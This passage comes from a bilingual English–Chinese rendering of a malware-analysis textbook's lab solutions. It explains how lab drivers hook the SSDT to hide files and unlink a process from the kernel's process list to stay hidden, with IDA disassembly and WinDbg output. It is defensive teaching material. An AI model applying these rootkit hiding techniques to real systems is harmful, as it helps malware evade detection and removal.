    that the DriverEntry routine calls RtlInitUnicodeString with KeServiceDescriptorTable
    and NtQueryDirectoryFile, and then calls MmGetSystemRoutineAddress to find the
    offsets for those two addresses. It next looks for the entry in the SSDT for NtQueryDirectoryFile
    Solutions to Labs
  id: totrans-2771
  prefs: []
  type: TYPE_NORMAL
  zh: 所有这些选项都足够简单，但第一个是最好的，因为它禁用了驱动程序。禁用驱动程序后，你应该首先在系统中搜索以 *Mlwx* 开头的文件，以防有其他文件被 *Mlwx486.sys*
    驱动程序隐藏。（在这种情况下没有。）在 IDA Pro 中打开 *Mlwx486.sys*，我们看到它非常小，因此我们应该分析它的全部内容，以确保驱动程序没有做我们不知道的其他事情。我们看到
    DriverEntry 例程调用 RtlInitUnicodeString 与 KeServiceDescriptorTable 和 NtQueryDirectoryFile，然后调用
    MmGetSystemRoutineAddress 来找到这两个地址的偏移量。接下来，它在 SSDT 中寻找 NtQueryDirectoryFile 的条目。
- en: '**559**'
  id: totrans-2772
  prefs: []
  type: TYPE_NORMAL
  zh: '**559**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2773
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: and overwrites that entry with the address of the PatchFunction. It doesn’t
    create a device, and it doesn’t add any function handlers to the driver object.
  id: totrans-2774
  prefs: []
  type: TYPE_NORMAL
  zh: 并用 PatchFunction 的地址覆盖该条目。它不创建设备，也不向驱动程序对象添加任何功能处理程序。
- en: '**Lab 10-3 Solutions**'
  id: totrans-2775
  prefs: []
  type: TYPE_NORMAL
  zh: '**实验10-3解答**'
- en: '***Short Answers***'
  id: totrans-2776
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: 1\.
  id: totrans-2777
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The user-space program loads the driver and then pops up an advertisement every
    30 seconds. The driver hides the process by unlinking the Process Environment
    Block (PEB) from the system’s linked list.
  id: totrans-2778
  prefs: []
  type: TYPE_NORMAL
  zh: 用户空间程序加载驱动程序，然后每30秒弹出一次广告。驱动程序通过将进程环境块（PEB）从系统的链接列表中取消链接来隐藏进程。
- en: 2\.
  id: totrans-2779
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: Once this program is running, there is no easy way to stop it without rebooting.
  id: totrans-2780
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦这个程序开始运行，没有重启就无法轻易停止它。
- en: 3\.
  id: totrans-2781
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: The kernel component responds to any DeviceIoControl request by unlinking the
    process that made the request from the linked list of processes in order to hide
    the process from the user.
  id: totrans-2782
  prefs: []
  type: TYPE_NORMAL
  zh: 内核组件通过从进程的链接列表中取消链接发出 DeviceIoControl 请求的进程来响应任何请求，以隐藏进程对用户。
- en: '***Detailed Analysis***'
  id: totrans-2783
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: 'We begin with some basic static analysis on the files. When we analyze the
    driver file, we see the following imports:'
  id: totrans-2784
  prefs: []
  type: TYPE_NORMAL
  zh: 我们从对文件的一些基本静态分析开始。当我们分析驱动程序文件时，我们看到以下导入：
- en: IofCompleteRequest
  id: totrans-2785
  prefs: []
  type: TYPE_NORMAL
  zh: IofCompleteRequest
- en: IoDeleteDevice
  id: totrans-2786
  prefs: []
  type: TYPE_NORMAL
  zh: IoDeleteDevice
- en: IoDeleteSymbolicLink
  id: totrans-2787
  prefs: []
  type: TYPE_NORMAL
  zh: IoDeleteSymbolicLink
- en: RtlInitUnicodeString
  id: totrans-2788
  prefs: []
  type: TYPE_NORMAL
  zh: RtlInitUnicodeString
- en: '**IoGetCurrentProcess**'
  id: totrans-2789
  prefs: []
  type: TYPE_NORMAL
  zh: '**IoGetCurrentProcess**'
- en: IoCreateSymbolicLink
  id: totrans-2790
  prefs: []
  type: TYPE_NORMAL
  zh: IoCreateSymbolicLink
- en: IoCreateDevice
  id: totrans-2791
  prefs: []
  type: TYPE_NORMAL
  zh: IoCreateDevice
- en: KeTickCount
  id: totrans-2792
  prefs: []
  type: TYPE_NORMAL
  zh: KeTickCount
- en: The import for IoGetCurrentProcess is the only one that provides much information.
    (The other imports are simply required by any driver that creates a device that
    is accessible from user space.) The call to IoGetCurrentProcess tells us that
    this driver either modifies the running process or requires information about
    it.
  id: totrans-2793
  prefs: []
  type: TYPE_NORMAL
  zh: IoGetCurrentProcess 的导入是唯一一个提供大量信息的。 (其他导入只是任何创建用户空间可访问设备的驱动程序所必需的。) IoGetCurrentProcess
    的调用告诉我们，这个驱动程序要么修改正在运行的过程，要么需要关于它的信息。
- en: Next, we copy the driver file into *C:\Windows\System32* and double-click the
    executable to run it. We see a pop-up ad, which is the same as the one in Lab
    7-2\. We now examine what it did to our system. First, we check to see if the
    service was successfully installed and verify that the malicious *.sys* file is
    used as part of the service. Simultaneously, we notice that after about 30 seconds,
    the program pops up the advertisement again and does so about once every 30 seconds.
    Opening Task Manager in an effort to terminate the program, we see that the program
    isn’t listed. And it’s not listed in Process Explorer either.
  id: totrans-2794
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将驱动程序文件复制到 *C:\Windows\System32*，然后双击可执行文件运行它。我们看到一个弹出广告，与第 7-2 实验中的相同。我们现在检查它对我们系统做了什么。首先，我们检查服务是否成功安装，并验证恶意
    *.sys* 文件是否作为服务的一部分使用。同时，我们注意到大约 30 秒后，程序再次弹出广告，大约每 30 秒发生一次。尝试在任务管理器中终止程序，我们看到程序没有列出。它也没有在进程资源管理器中列出。
- en: The program continues to open advertisements, and there’s no easy way to stop
    it. It’s not in a process listing, so we can’t stop it by killing the process.
  id: totrans-2795
  prefs: []
  type: TYPE_NORMAL
  zh: 程序继续打开广告，没有简单的方法可以停止它。它不在进程列表中，所以我们不能通过终止进程来停止它。
- en: Nor can we attach a debugger to the process because the program doesn’t show
    up in the process listing for WinDbg or OllyDbg. At this point, our only **560**
  id: totrans-2796
  prefs: []
  type: TYPE_NORMAL
  zh: 我们也无法将调试器附加到进程，因为程序没有出现在 WinDbg 或 OllyDbg 的进程列表中。此时，我们唯一的 **560**
- en: Appendix C
  id: totrans-2797
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2798
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: choice is to revert to our most recent snapshot or reboot and hope that the
    program isn’t persistent. It’s not, so a reboot stops it.
  id: totrans-2799
  prefs: []
  type: TYPE_NORMAL
  zh: 选择恢复到最近的快照或重新启动并希望程序不是持久的。它不是，所以重新启动可以停止它。
- en: '**Analyzing the Executable in IDA Pro**'
  id: totrans-2800
  prefs: []
  type: TYPE_NORMAL
  zh: '**在 IDA Pro 中分析可执行文件**'
- en: 'Now to IDA Pro. Navigating to WinMain and examining the functions it calls,
    we see the following:'
  id: totrans-2801
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，转到 IDA Pro，导航到 WinMain 并检查它调用的函数，我们看到以下内容：
- en: OpenSCManager
  id: totrans-2802
  prefs: []
  type: TYPE_NORMAL
  zh: OpenSCManager
- en: CreateService
  id: totrans-2803
  prefs: []
  type: TYPE_NORMAL
  zh: CreateService
- en: StartService
  id: totrans-2804
  prefs: []
  type: TYPE_NORMAL
  zh: StartService
- en: CloseServiceHandle
  id: totrans-2805
  prefs: []
  type: TYPE_NORMAL
  zh: CloseServiceHandle
- en: CreateFile
  id: totrans-2806
  prefs: []
  type: TYPE_NORMAL
  zh: CreateFile
- en: DeviceIoControl
  id: totrans-2807
  prefs: []
  type: TYPE_NORMAL
  zh: DeviceIoControl
- en: OleInitialize
  id: totrans-2808
  prefs: []
  type: TYPE_NORMAL
  zh: OleInitialize
- en: CoCreateInstance
  id: totrans-2809
  prefs: []
  type: TYPE_NORMAL
  zh: CoCreateInstance
- en: VariantInit
  id: totrans-2810
  prefs: []
  type: TYPE_NORMAL
  zh: VariantInit
- en: SysAllocString
  id: totrans-2811
  prefs: []
  type: TYPE_NORMAL
  zh: SysAllocString
- en: ecx+0x2c
  id: totrans-2812
  prefs: []
  type: TYPE_NORMAL
  zh: ecx+0x2c
- en: Sleep
  id: totrans-2813
  prefs: []
  type: TYPE_NORMAL
  zh: Sleep
- en: '**10**'
  id: totrans-2814
  prefs: []
  type: TYPE_NORMAL
  zh: '**10**'
- en: OleUninitialize
  id: totrans-2815
  prefs: []
  type: TYPE_NORMAL
  zh: OleUninitialize
- en: WinMain can be logically broken into two sections. The first section, consisting
    of OpenSCManager through DeviceIoControl, includes the functions to load and send
    a request to the kernel driver. The second section consists of the remaining functions,
    which show the usage of a COM object. At this point, we don’t know the target
    of the call to ecx+0x2c, but we’ll come back to that later.
  id: totrans-2816
  prefs: []
  type: TYPE_NORMAL
  zh: WinMain 可以逻辑上分为两部分。第一部分，从 OpenSCManager 到 DeviceIoControl，包括加载和向内核驱动程序发送请求的函数。第二部分包括剩余的函数，展示了
    COM 对象的使用。到目前为止，我们还不知道 ecx+0x2c 调用的目标，但稍后我们会回来讨论这个问题。
- en: Looking at the calls in detail, we see that the program creates a service called
    Process Helper, which loads the kernel driver *C:\Windows\System32\* *Lab10-03.sys*.
    It then starts the Process Helper service, which loads *Lab10-03.sys* into the
    kernel and opens a handle to *\\.\ProcHelper*, which opens a handle to the kernel
    device created by the ProcHelper driver.
  id: totrans-2817
  prefs: []
  type: TYPE_NORMAL
  zh: 详细查看调用，我们看到程序创建了一个名为 Process Helper 的服务，该服务加载了内核驱动程序 *C:\Windows\System32\*
    *Lab10-03.sys*。然后它启动了 Process Helper 服务，将 *Lab10-03.sys* 加载到内核，并打开对 *\\.\ProcHelper*
    的句柄，该句柄打开了对 ProcHelper 驱动程序创建的内核设备的句柄。
- en: We need to look carefully at the call to DeviceIoControl, shown in Listing 10-14L,
    because the input and output parameters passed as arguments to it will be sent
    to the kernel code, which we will need to analyze separately.
  id: totrans-2818
  prefs: []
  type: TYPE_NORMAL
  zh: 我们需要仔细查看 DeviceIoControl 调用，如列表 10-14L 所示，因为作为参数传递给它的输入和输出参数将被发送到内核代码，我们将需要单独分析这些代码。
- en: 0040108C lea ecx, [esp+2Ch+BytesReturned]
  id: totrans-2819
  prefs: []
  type: TYPE_NORMAL
  zh: 0040108C lea ecx, [esp+2Ch+BytesReturned]
- en: 00401090 push 0 ; lpOverlapped 00401092 push ecx ; lpBytesReturned 00401093
    push 0 ; nOutBufferSize 00401095 push
  id: totrans-2820
  prefs: []
  type: TYPE_NORMAL
  zh: 00401090 push 0 ; lpOverlapped 00401092 push ecx ; lpBytesReturned 00401093
    push 0 ; nOutBufferSize 00401095 push
- en: **0** ; lpOutBuffer
  id: totrans-2821
  prefs: []
  type: TYPE_NORMAL
  zh: **0** ; lpOutBuffer
- en: 00401097 push 0 ; nInBufferSize 00401099 push
  id: totrans-2822
  prefs: []
  type: TYPE_NORMAL
  zh: 00401097 push 0 ; nInBufferSize 00401099 push
- en: **0** ; lpInBuffer
  id: totrans-2823
  prefs: []
  type: TYPE_NORMAL
  zh: **0** ; lpInBuffer
- en: 0040109B push
  id: totrans-2824
  prefs: []
  type: TYPE_NORMAL
  zh: 0040109B push
- en: 0ABCDEF01h ; dwIoControlCode
  id: totrans-2825
  prefs: []
  type: TYPE_NORMAL
  zh: 0ABCDEF01h ; dwIoControlCode
- en: 004010A0 push eax ; hDevice 004010A1 call ds:DeviceIoControl
  id: totrans-2826
  prefs: []
  type: TYPE_NORMAL
  zh: 004010A0 push eax ; hDevice 004010A1 call ds:DeviceIoControl
- en: '*Listing 10-14L: A call to DeviceIoControl in* Lab10-03.exe *to pass a request
    to the* Lab10-03.sys *driver*'
  id: totrans-2827
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-14L：Lab10-03.exe 中的 DeviceIoControl 调用，将请求传递给 Lab10-03.sys 驱动器*'
- en: Solutions to Labs
  id: totrans-2828
  prefs: []
  type: TYPE_NORMAL
  zh: 解决实验方案
- en: '**561**'
  id: totrans-2829
  prefs: []
  type: TYPE_NORMAL
  zh: '**561**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2830
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Notice that the call to DeviceIoControl has lpOutBuffer at  and lpInBuffer
    at  set to NULL. This is unusual, and it means that this request sends no information
    to the kernel driver and that the kernel driver sends no information back. Also
    notice that the dwIoControlCode of 0xABCDEF01 at  is passed to the kernel driver.
    We’ll revisit this when we look at the kernel driver.
  id: totrans-2831
  prefs: []
  type: TYPE_NORMAL
  zh: 注意，调用 DeviceIoControl 时，lpOutBuffer 在  处和 lpInBuffer 在  处被设置为 NULL。这很不寻常，这意味着这个请求不会向内核驱动程序发送任何信息，内核驱动程序也不会发送任何信息回来。另外，请注意，0xABCDEF01
    的 dwIoControlCode 在  处被传递给内核驱动程序。当我们查看内核驱动程序时，我们将重新审视这一点。
- en: The remainder of this file is nearly identical to the COM example in Lab 7-2,
    except that the call to the navigate function is inside a loop that runs continuously
    and sleeps for 30 seconds between each call.
  id: totrans-2832
  prefs: []
  type: TYPE_NORMAL
  zh: 此文件剩余部分几乎与 Lab 7-2 中的 COM 示例相同，只是调用导航函数的调用位于一个持续运行的循环中，每次调用之间休眠 30 秒。
- en: '**Analyzing the Driver**'
  id: totrans-2833
  prefs: []
  type: TYPE_NORMAL
  zh: '**分析驱动程序**'
- en: Next, we open the kernel file with IDA Pro. As shown in Listing 10-15L, we see
    that it calls IoCreateDevice at  to create a device named \Device\ProcHelper
    at .
  id: totrans-2834
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们使用 IDA Pro 打开内核文件。如列表 10-15L 所示，我们看到它调用 IoCreateDevice 在  处创建一个名为 \Device\ProcHelper
    的设备。
- en: 0001071A push offset aDeviceProchelp ; "\\Device\\ProcHelper"
  id: totrans-2835
  prefs: []
  type: TYPE_NORMAL
  zh: 0001071A push offset aDeviceProchelp ; "\\Device\\ProcHelper"
- en: 0001071F lea eax, [ebp+var_C]
  id: totrans-2836
  prefs: []
  type: TYPE_NORMAL
  zh: 0001071F lea eax, [ebp+var_C]
- en: 00010722 push eax
  id: totrans-2837
  prefs: []
  type: TYPE_NORMAL
  zh: 00010722 push eax
- en: 00010723 call edi ; RtlInitUnicodeString
  id: totrans-2838
  prefs: []
  type: TYPE_NORMAL
  zh: 00010723 call edi ; RtlInitUnicodeString
- en: 00010725 mov esi, [ebp+arg_0]
  id: totrans-2839
  prefs: []
  type: TYPE_NORMAL
  zh: 00010725 mov esi, [ebp+arg_0]
- en: 00010728 lea eax, [ebp+var_4]
  id: totrans-2840
  prefs: []
  type: TYPE_NORMAL
  zh: 00010728 lea eax, [ebp+var_4]
- en: 0001072B push eax
  id: totrans-2841
  prefs: []
  type: TYPE_NORMAL
  zh: 0001072B push eax
- en: 0001072C push 0
  id: totrans-2842
  prefs: []
  type: TYPE_NORMAL
  zh: 0001072C push 0
- en: 0001072E push 100h
  id: totrans-2843
  prefs: []
  type: TYPE_NORMAL
  zh: 0001072E push 100h
- en: 00010733 push 22h
  id: totrans-2844
  prefs: []
  type: TYPE_NORMAL
  zh: 00010733 push 22h
- en: 00010735 lea eax, [ebp+var_C]
  id: totrans-2845
  prefs: []
  type: TYPE_NORMAL
  zh: 00010735 lea eax, [ebp+var_C]
- en: 00010738 push eax
  id: totrans-2846
  prefs: []
  type: TYPE_NORMAL
  zh: 00010738 push eax
- en: 00010739 push 0
  id: totrans-2847
  prefs: []
  type: TYPE_NORMAL
  zh: 00010739 push 0
- en: 0001073B push esi
  id: totrans-2848
  prefs: []
  type: TYPE_NORMAL
  zh: 0001073B push esi
- en: 0001073C call ds:IoCreateDevice
  id: totrans-2849
  prefs: []
  type: TYPE_NORMAL
  zh: 0001073C call ds:IoCreateDevice
- en: '*Listing 10-15L:* Lab10-03.sys *creating a device that is accessible from user
    space* As shown in Listing 10-16L, the function then calls IoCreateSymbolicLink
    at  to create a symbolic link named \DosDevices\ProcHelper at  for the user-space
    program to access.'
  id: totrans-2850
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-15L:* Lab10-03.sys *创建一个可以从用户空间访问的设备* 如列表 10-16L 所示，该函数随后调用 IoCreateSymbolicLink
    在  处创建一个名为 \DosDevices\ProcHelper 的符号链接，以便用户空间程序访问。'
- en: 00010751 push offset aDosdevicesPr_0 ; "\\DosDevices\\ProcHelper"
  id: totrans-2851
  prefs: []
  type: TYPE_NORMAL
  zh: 00010751 push offset aDosdevicesPr_0 ; "\\DosDevices\\ProcHelper"
- en: 00010756 lea eax, [ebp+var_14]
  id: totrans-2852
  prefs: []
  type: TYPE_NORMAL
  zh: 00010756 lea eax, [ebp+var_14]
- en: 00010759 push eax
  id: totrans-2853
  prefs: []
  type: TYPE_NORMAL
  zh: 00010759 push eax
- en: 0001075A mov dword ptr [esi+70h], offset loc_10666
  id: totrans-2854
  prefs: []
  type: TYPE_NORMAL
  zh: 0001075A mov dword ptr [esi+70h], offset loc_10666
- en: 00010761 mov dword ptr [esi+34h], offset loc_1062A 00010768 call edi ; RtlInitUnicodeString
  id: totrans-2855
  prefs: []
  type: TYPE_NORMAL
  zh: 00010761 mov dword ptr [esi+34h], offset loc_1062A 00010768 call edi ; RtlInitUnicodeString
- en: 0001076A lea eax, [ebp+var_C]
  id: totrans-2856
  prefs: []
  type: TYPE_NORMAL
  zh: 0001076A lea eax, [ebp+var_C]
- en: 0001076D push eax
  id: totrans-2857
  prefs: []
  type: TYPE_NORMAL
  zh: 0001076D push eax
- en: 0001076E lea eax, [ebp+var_14]
  id: totrans-2858
  prefs: []
  type: TYPE_NORMAL
  zh: 0001076E lea eax, [ebp+var_14]
- en: 00010771 push eax
  id: totrans-2859
  prefs: []
  type: TYPE_NORMAL
  zh: 00010771 push eax
- en: 00010772 call ds:IoCreateSymbolicLink
  id: totrans-2860
  prefs: []
  type: TYPE_NORMAL
  zh: 00010772 call ds:IoCreateSymbolicLink
- en: '*Listing 10-16L:* Lab10-03.sys *creating a symbolic link to make it easier
    for user-space applications to access a handle to the device*'
  id: totrans-2861
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-16L:* Lab10-03.sys *创建一个符号链接，以便用户空间应用程序更容易访问设备句柄*'
- en: '**562**'
  id: totrans-2862
  prefs: []
  type: TYPE_NORMAL
  zh: '**562**'
- en: Appendix C
  id: totrans-2863
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2864
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Finding the Driver in Memory with WinDbg** We can either run the malware
    or just start the service to load our kernel driver into memory. We know that
    the device object is at \Device\ProcHelper, so we start with it. In order to find
    the function in ProcHelper that is executed, we must find the driver object, which
    can be done with the !devobj command, as shown in Listing 10-17L. The output of
    !devobj tells us where the DriverObject at  is stored.'
  id: totrans-2865
  prefs: []
  type: TYPE_NORMAL
  zh: '**使用 WinDbg 在内存中查找驱动程序** 我们可以运行恶意软件或只是启动服务来将我们的内核驱动程序加载到内存中。我们知道设备对象位于 \Device\ProcHelper，所以我们从这里开始。为了找到
    ProcHelper 中执行的功能，我们必须找到驱动程序对象，可以使用 !devobj 命令来完成，如列表 10-17L 所示。!devobj 的输出告诉我们
    DriverObject 在  处的存储位置。'
- en: kd> **!devobj ProcHelper**
  id: totrans-2866
  prefs: []
  type: TYPE_NORMAL
  zh: kd> **!devobj ProcHelper**
- en: 'Device object (82af64d0) is for:'
  id: totrans-2867
  prefs: []
  type: TYPE_NORMAL
  zh: 设备对象 (82af64d0) 用于：
- en: ProcHelper \Driver\Process Helper DriverObject 82716a98
  id: totrans-2868
  prefs: []
  type: TYPE_NORMAL
  zh: ProcHelper \Driver\Process Helper DriverObject 82716a98
- en: Current Irp 00000000 RefCount 1 Type 00000022 Flags 00000040
  id: totrans-2869
  prefs: []
  type: TYPE_NORMAL
  zh: 当前 Irp 00000000 RefCount 1 Type 00000022 Flags 00000040
- en: Dacl e15b15cc DevExt 00000000 DevObjExt 82af6588
  id: totrans-2870
  prefs: []
  type: TYPE_NORMAL
  zh: Dacl e15b15cc DevExt 00000000 DevObjExt 82af6588
- en: ExtensionFlags (0000000000)
  id: totrans-2871
  prefs: []
  type: TYPE_NORMAL
  zh: 扩展标志 (0000000000)
- en: Device queue is not busy.
  id: totrans-2872
  prefs: []
  type: TYPE_NORMAL
  zh: 设备队列不忙。
- en: '*Listing 10-17L: Finding the device object for the ProcHelper driver* **10**'
  id: totrans-2873
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-17L: 查找 ProcHelper 驱动程序的设备对象* **10**'
- en: The DriverObject contains pointers to all of the functions that will be called
    when a user-space program accesses the device object. The DriverObject is stored
    in a data structure called DRIVER_OBJECT. We can use the dt command to view the
    driver object with labels, as shown in Listing 10-18L.
  id: totrans-2874
  prefs: []
  type: TYPE_NORMAL
  zh: 驱动程序对象包含指向所有将在用户空间程序访问设备对象时被调用的函数的指针。驱动程序对象存储在名为 DRIVER_OBJECT 的数据结构中。我们可以使用
    dt 命令以标签形式查看驱动程序对象，如列表 10-18L 所示。
- en: kd> **dt nt!_DRIVER_OBJECT 82716a98**
  id: totrans-2875
  prefs: []
  type: TYPE_NORMAL
  zh: kd> **dt nt!_DRIVER_OBJECT 82716a98**
- en: '+0x000 Type : 4'
  id: totrans-2876
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x000 类型 : 4'
- en: '+0x002 Size : 168'
  id: totrans-2877
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x002 大小 : 168'
- en: '+0x004 DeviceObject : 0x82af64d0 _DEVICE_OBJECT'
  id: totrans-2878
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x004 设备对象 : 0x82af64d0 _DEVICE_OBJECT'
- en: '+0x008 Flags : 0x12'
  id: totrans-2879
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x008 标志 : 0x12'
- en: '+0x00c DriverStart : 0xf7c26000'
  id: totrans-2880
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x00c DriverStart : 0xf7c26000'
- en: '+0x010 DriverSize : 0xe00'
  id: totrans-2881
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x010 驱动程序大小 : 0xe00'
- en: '+0x014 DriverSection : 0x827bd598'
  id: totrans-2882
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x014 驱动程序部分 : 0x827bd598'
- en: '+0x018 DriverExtension : 0x82716b40 _DRIVER_EXTENSION'
  id: totrans-2883
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x018 驱动扩展 : 0x82716b40 _DRIVER_EXTENSION'
- en: '+0x01c DriverName : _UNICODE_STRING "\Driver\Process Helper"'
  id: totrans-2884
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x01c 驱动程序名称 : _UNICODE_STRING "\Driver\Process Helper"'
- en: '+0x024 HardwareDatabase : 0x80670ae0 _UNICODE_STRING "\REGISTRY\MACHINE\ HARDWARE\DESCRIPTION\SYSTEM"'
  id: totrans-2885
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x024 硬件数据库 : 0x80670ae0 _UNICODE_STRING "\REGISTRY\MACHINE\ HARDWARE\DESCRIPTION\SYSTEM"'
- en: '+0x028 FastIoDispatch : (null)'
  id: totrans-2886
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x028 快速 I/O 分派 : (null)'
- en: '+0x02c **DriverInit** : 0xf7c267cd long +0'
  id: totrans-2887
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x02c **DriverInit** : 0xf7c267cd long +0'
- en: '+0x030 DriverStartIo : (null)'
  id: totrans-2888
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x030 驱动程序启动 I/O : (null)'
- en: '+0x034 **DriverUnload** : 0xf7c2662a void +0'
  id: totrans-2889
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x034 **DriverUnload** : 0xf7c2662a void +0'
- en: '+0x038 MajorFunction : [28] 0xf7c26606 long +0'
  id: totrans-2890
  prefs: []
  type: TYPE_NORMAL
  zh: '+0x038 主要功能 : [28] 0xf7c26606 long +0'
- en: '*Listing 10-18L: Examining the driver object for* Lab10-03.sys *using WinDbg*
    This code contains several function pointers of note. These include DriverInit,
    the DriverEntry routine we analyzed in IDA Pro, and DriverUnload, which is called
    when this driver is unloaded. When we look at DriverUnload in IDA Pro, we see
    that it deletes the symbolic link and the device created by the DriverEntry program.'
  id: totrans-2891
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-18L：使用 WinDbg 检查* Lab10-03.sys *的驱动程序对象* 此代码包含多个值得注意的函数指针。这些包括 DriverInit，我们在
    IDA Pro 中分析的 DriverEntry 例程，以及 DriverUnload，当此驱动程序卸载时会被调用。当我们查看 IDA Pro 中的 DriverUnload
    时，我们看到它删除了由 DriverEntry 程序创建的符号链接和设备。'
- en: Solutions to Labs
  id: totrans-2892
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**563**'
  id: totrans-2893
  prefs: []
  type: TYPE_NORMAL
  zh: '**563**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-2894
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Analyzing the Functions of the Major Function Table** Next, we examine the
    major function table, which is often where the most interesting driver code is
    implemented. Windows XP allows 0x1C possible major function codes, so we view
    the entries in the major function table using the dd command:'
  id: totrans-2895
  prefs: []
  type: TYPE_NORMAL
  zh: '**分析主要功能表中的函数** 接下来，我们检查主要功能表，通常这里实现了最有意思的驱动程序代码。Windows XP 允许 0x1C 个可能的主要功能代码，因此我们使用
    dd 命令查看主要功能表中的条目：'
- en: kd> **dd 82716a98+0x38 L1C**
  id: totrans-2896
  prefs: []
  type: TYPE_NORMAL
  zh: kd> **dd 82716a98+0x38 L1C**
- en: 82716ad0
  id: totrans-2897
  prefs: []
  type: TYPE_NORMAL
  zh: 82716ad0
- en: f7c26606 804f354a f7c26606 804f354a
  id: totrans-2898
  prefs: []
  type: TYPE_NORMAL
  zh: f7c26606 804f354a f7c26606 804f354a
- en: 82716ae0
  id: totrans-2899
  prefs: []
  type: TYPE_NORMAL
  zh: 82716ae0
- en: 804f354a 804f354a 804f354a 804f354a
  id: totrans-2900
  prefs: []
  type: TYPE_NORMAL
  zh: 804f354a 804f354a 804f354a 804f354a
- en: 82716af0
  id: totrans-2901
  prefs: []
  type: TYPE_NORMAL
  zh: 82716af0
- en: 804f354a 804f354a 804f354a 804f354a
  id: totrans-2902
  prefs: []
  type: TYPE_NORMAL
  zh: 804f354a 804f354a 804f354a 804f354a
- en: 82716b00
  id: totrans-2903
  prefs: []
  type: TYPE_NORMAL
  zh: 82716b00
- en: 804f354a 804f354a f7c26666 804f354a
  id: totrans-2904
  prefs: []
  type: TYPE_NORMAL
  zh: 804f354a 804f354a f7c26666 804f354a
- en: 82716b10
  id: totrans-2905
  prefs: []
  type: TYPE_NORMAL
  zh: 82716b10
- en: 804f354a 804f354a 804f354a 804f354a
  id: totrans-2906
  prefs: []
  type: TYPE_NORMAL
  zh: 804f354a 804f354a 804f354a 804f354a
- en: 82716b20
  id: totrans-2907
  prefs: []
  type: TYPE_NORMAL
  zh: 82716b20
- en: 804f354a 804f354a 804f354a 804f354a
  id: totrans-2908
  prefs: []
  type: TYPE_NORMAL
  zh: 804f354a 804f354a 804f354a 804f354a
- en: 82716b30
  id: totrans-2909
  prefs: []
  type: TYPE_NORMAL
  zh: 82716b30
- en: 804f354a 804f354a 804f354a 804f354a
  id: totrans-2910
  prefs: []
  type: TYPE_NORMAL
  zh: 804f354a 804f354a 804f354a 804f354a
- en: Each entry in the table represents a different type of request that the driver
    can handle, but as you can see, most of the entries in the table are for the same
    function at 0X804F354A. All of the entries in the table with the value 0X804F354A
    represent a request type that the driver does not handle.
  id: totrans-2911
  prefs: []
  type: TYPE_NORMAL
  zh: 表中的每个条目都代表驱动程序可以处理的不同类型的请求，但如您所见，表中的大多数条目都是针对同一函数 0X804F354A 的。表中所有值为 0X804F354A
    的条目都代表驱动程序不处理的请求类型。
- en: 'To verify this, we need to find out what that function does. We could view
    its disassembly, but because it’s a Windows function, its name should tell us
    what it does, as shown here:'
  id: totrans-2912
  prefs: []
  type: TYPE_NORMAL
  zh: 为了验证这一点，我们需要找出该函数的功能。我们可以查看其反汇编代码，但由于它是一个 Windows 函数，其名称应该告诉我们它做什么，如下所示：
- en: kd> **ln 804f354a**
  id: totrans-2913
  prefs: []
  type: TYPE_NORMAL
  zh: kd> **ln 804f354a**
- en: (804f354a) nt! **IopInvalidDeviceRequest** | (804f3580) nt!IopGetDeviceAttachmentBase
  id: totrans-2914
  prefs: []
  type: TYPE_NORMAL
  zh: (804f354a) nt! **IopInvalidDeviceRequest** | (804f3580) nt!IopGetDeviceAttachmentBase
- en: 'Exact matches:'
  id: totrans-2915
  prefs: []
  type: TYPE_NORMAL
  zh: 精确匹配：
- en: nt!IopInvalidDeviceRequest = <no type information> The function at 0X804F354A
    is named IopInvalidDeviceRequest, which means that it handles invalid requests
    that this driver doesn’t handle. The remaining functions from the major function
    table at offsets 0, 2, and 0xe contain the functionality that we are interested
    in. Examining *wdm.h*, we find that offsets of 0, 2, and 0xe store the functions
    for the Create, Close, and DeviceIoControl functions.
  id: totrans-2916
  prefs: []
  type: TYPE_NORMAL
